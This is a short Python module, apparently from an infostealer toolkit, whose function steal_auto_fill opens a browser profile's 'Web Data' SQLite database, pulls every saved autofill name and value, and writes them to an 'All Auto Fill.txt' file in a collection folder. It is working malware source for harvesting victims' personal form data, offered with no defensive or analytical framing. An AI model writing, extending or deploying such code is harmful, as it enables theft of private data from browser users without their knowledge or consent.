import sqlite3
import os


#---------------------------------------------
from modules.Browsers._data_breeding_ import AutoFill
#---------------------------------------------

import log_Style


def steal_auto_fill(profile_path: str, king_folder: str, browser_name: str)-> None:

    auto_fill_db_path: str = f'{profile_path}\\Web Data'

    if not os.path.exists(auto_fill_db_path):
        return None 
    try:
        with sqlite3.connect(auto_fill_db_path) as conn_auto_fill:
            cursor: object = conn_auto_fill.cursor()
            cursor.execute(
                "SELECT name, value FROM autofill"
            )
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                log_Style.ALL_AUTO_FILL += 1
                with open(f'{king_folder}\\All Auto Fill.txt', "a", encoding='utf-8', errors='ignore') as auto_fill:
                    auto_fill.write(str(AutoFill(row[0], row[1], browser_name)))
    except Exception as err:
        print(err)

